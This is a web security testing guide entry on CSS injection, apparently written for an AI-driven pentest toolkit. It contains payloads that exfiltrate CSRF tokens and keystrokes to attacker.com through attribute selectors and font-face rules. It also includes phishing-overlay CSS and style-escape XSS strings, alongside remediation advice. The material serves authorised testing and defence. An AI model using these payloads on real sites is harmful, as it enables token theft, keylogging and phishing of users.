---
id: WSTG-CLNT-05
title: Testing for CSS Injection
category: Client-Side
severity_range: Low-Medium
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection
---

# WSTG-CLNT-05: Testing for CSS Injection

## Summary

CSS injection occurs when user-controllable data is inserted into CSS contexts without proper sanitization. Attackers can inject malicious CSS to exfiltrate sensitive data (CSRF tokens, page content) using attribute selectors and background-url requests, deface pages, create phishing overlays, track user interactions through CSS-based keylogging, and in some browsers leverage CSS expressions for JavaScript execution.

## Test Objectives

- Identify user input reflected in CSS contexts (style attributes, style tags, CSS files)
- Test if CSS properties can be injected to modify page appearance
- Assess data exfiltration potential via CSS attribute selectors
- Check for CSS expression support (legacy browsers)

## Prerequisites

- Target application reflects user input in CSS contexts
- Docker pentest container capturing traffic
- Input parameters that affect page styling have been identified

## Test Steps

### Step 1: Identify CSS Injection Points

**CLI Actions:**
Use `curl` to identify where user input appears in CSS contexts:

```
GET /page?theme=default HTTP/1.1
Host: target.com
```

```
GET /profile?color=blue HTTP/1.1
Host: target.com
```

Look for user input appearing in:
- Inline `style` attributes: `<div style="color: USER_INPUT">`
- `<style>` blocks: `<style>.class { property: USER_INPUT }</style>`
- External CSS loaded dynamically
- CSS custom properties (variables)

### Step 2: Test Basic CSS Property Injection

**CLI Actions:**
Use `curl` to inject CSS properties:

```
GET /page?color=red;background:url(http://attacker.com/log) HTTP/1.1
Host: target.com
```

```
GET /page?theme=default;}</style><h1>Injected</h1><style>.x{ HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` to encode special characters for URL parameters.

### Step 3: Test Data Exfiltration via CSS Attribute Selectors

**CLI Actions:**
CSS attribute selectors can be used to exfiltrate the value of HTML attributes (like CSRF tokens) character by character.

Use `curl` to inject CSS that targets `input[value^="a"]`:

```
GET /page?style=input[value^="a"]{background:url(http://attacker.com/a)}input[value^="b"]{background:url(http://attacker.com/b)} HTTP/1.1
Host: target.com
```

This technique works by:
1. Creating CSS rules that match input elements whose value starts with specific characters
2. Each matching rule triggers a background URL request to the attacker's server
3. By observing which requests arrive, the attacker learns the value character by character

Use `save to manual-review file` to iterate through different character positions and values.

### Step 4: Test CSS-Based Keylogging

**CLI Actions:**
Use `curl` to inject CSS that detects keystrokes via font-face timing:

```
GET /page?css=@font-face{font-family:a;src:url(http://attacker.com/a);unicode-range:U+0061}input{font-family:a} HTTP/1.1
Host: target.com
```

This is limited but can detect which characters are typed in input fields by loading specific font files for each Unicode range.

### Step 5: Test CSS for Page Defacement/Phishing

**CLI Actions:**
Use `curl` to inject CSS that creates a phishing overlay:

```
GET /page?style=body{visibility:hidden}body:after{visibility:visible;position:fixed;top:0;left:0;width:100%;content:'Session expired. Please login at attacker.com'} HTTP/1.1
Host: target.com
```

```
GET /page?color=red}*{display:none}.phish{display:block HTTP/1.1
Host: target.com
```

### Step 6: Test CSS Expression (Legacy IE)

**CLI Actions:**
Use `curl` to test CSS expressions (only relevant for IE < 11):

```
GET /page?style=xss:expression(alert('XSS')) HTTP/1.1
Host: target.com
```

```
GET /page?bg=url(javascript:alert('XSS')) HTTP/1.1
Host: target.com
```

While modern browsers do not support CSS expressions, some legacy applications may still be accessed via older browsers.

Use `rynix_plugin_run('template-scan')` to check for CSS injection findings.

## Payloads

### Basic CSS Injection
```
red; background: url(http://attacker.com/log)
red; } .x { background: url(http://attacker.com/log)
</style><script>alert('XSS')</script><style>
```

### Data Exfiltration via Attribute Selectors
```
input[name=csrf][value^="a"]{background:url(//attacker.com/?c=a)}
input[name=csrf][value^="b"]{background:url(//attacker.com/?c=b)}
input[name=csrf][value^="c"]{background:url(//attacker.com/?c=c)}
...for all alphanumeric characters
```

### Phishing/Defacement CSS
```
body{visibility:hidden}
body:after{visibility:visible;position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;content:'Maintenance page'}
```

### CSS Expression Payloads (Legacy IE)
```
xss:expression(alert('XSS'))
background:url(javascript:alert('XSS'))
behavior:url(xss.htc)
-moz-binding:url(xss.xml#xss)
```

### Style Context Escape
```
# Escape from style attribute
red" onmouseover="alert('XSS')
red;}</style><script>alert('XSS')</script>
# Escape from style block
color:red;} body:after{content:url(//attacker.com/log)} .x{
```

## Detection Criteria

A finding should be logged when:
- User input is reflected unsanitized in CSS contexts (style attributes, style blocks)
- Injected CSS properties render in the page
- CSS attribute selectors can be used to exfiltrate data from the page
- CSS injection allows creating phishing overlays or page defacement
- Style context can be escaped to inject HTML (potential XSS escalation)
- CSS expressions execute JavaScript (legacy browsers)

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| CSS injection escalates to JavaScript execution via context escape | High (treat as XSS) |
| CSS attribute selectors allow CSRF token exfiltration | Medium |
| CSS injection creates convincing phishing overlays | Medium |
| CSS-based data exfiltration of other sensitive page content | Medium |
| Page defacement via injected CSS properties | Low |
| CSS injection limited to non-security-impacting styling changes | Low |
| CSS expressions work in legacy browser testing only | Low |
| All CSS input properly sanitized and escaped | Not a finding |

## Remediation

- Never insert user input directly into CSS contexts
- Allowlist accepted CSS values (e.g., predefined color names, numeric values only)
- Escape CSS special characters: `\`, `(`, `)`, `;`, `{`, `}`, `"`, `'`
- Use Content-Security-Policy `style-src` directive to restrict inline styles
- Avoid user-controlled CSS custom properties
- Sanitize style attribute values: only allow known-safe properties and values
- Use CSS modules or scoped styles in frontend frameworks to prevent injection
- For user-customizable themes, use predefined theme variables rather than arbitrary CSS input

## References

- [OWASP Testing Guide - CSS Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [Exfiltration via CSS Injection - technique Research](https://owasp.org/research/blind-css-exfiltration)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

